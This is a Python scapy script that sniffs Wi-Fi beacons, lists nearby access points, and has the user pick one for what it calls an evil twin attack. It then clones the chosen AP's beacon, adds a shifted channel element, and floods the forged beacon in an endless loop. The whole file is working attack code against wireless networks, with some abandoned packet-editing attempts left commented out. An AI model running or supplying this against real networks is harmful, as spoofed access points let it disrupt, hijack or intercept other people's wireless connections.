from scapy.all import *
import signal

pkt_full_list = []
bssid_list = []
counter = 0
interface = input("Enter interface to listed on (must be on monitor mode : \n")
print("APs will be listed here, wait 20s and choose one  :\n")

def pkt_callback(pkt):
    if pkt.haslayer(Dot11Beacon):
        bssid = pkt.getlayer(Dot11).addr2.upper()
        if bssid not in bssid_list:
            bssid_list.append(bssid)
            pkt_full_list.append(pkt)
            try:
                dbm_signal = pkt.dBm_AntSignal
            except:
                dbm_signal = "N/A"
            # extract network stats
            stats = pkt[Dot11Beacon].network_stats()
            # get the channel of the AP
            channel = stats.get("channel")
            global counter
            counter += 1
            print(counter, " : \t", bssid, " SSID : ", pkt[Dot11].info, " Channel : ", channel, "RSSI : ", dbm_signal)


sniff(iface=interface, prn=pkt_callback, timeout=10)

evilTwinTarget = input("Choose one of the AP to do an evil twin attack :\n")
evilTwinTarget = int(evilTwinTarget)
pktSource = pkt_full_list[evilTwinTarget -1]
print("Actual Channel : ", pktSource[Dot11Beacon].network_stats().get("channel"))

channel = pktSource[Dot11Beacon].network_stats().get("channel")
#print(ls(pktSource))
newPkt = pktSource.copy()
#newPkt[Dot11Elt].payload.payload.info = chr((channel + 6) % 11)
#p = pktSource[Dot11Elt].payload
#last = Dot11Elt(pktSource[Dot11Elt])
#while isinstance(p, Dot11Elt):
#    if p.ID == 3:
#        p = p.payload
#        break
#    print(p.ID, " : ", p.info, " : ", p.len)
#    last /= Dot11Elt(ID=p.ID, info=p.info, len=p.len)
#    p = p.payload

#newPkt[Dot11Elt] = last/Dot11Elt(ID="DSset", info=chr((channel + 6)%13))/p
newPkt = newPkt/Dot11Elt(ID="DSset", info=chr((channel + 6)%13))
#print(pktSource.show())
#print(newPkt.show())
newChannel = newPkt[Dot11Beacon].network_stats().get("channel")
print("New Channel : ", newChannel)
sendp(newPkt, inter=0.001,loop=1, iface=interface)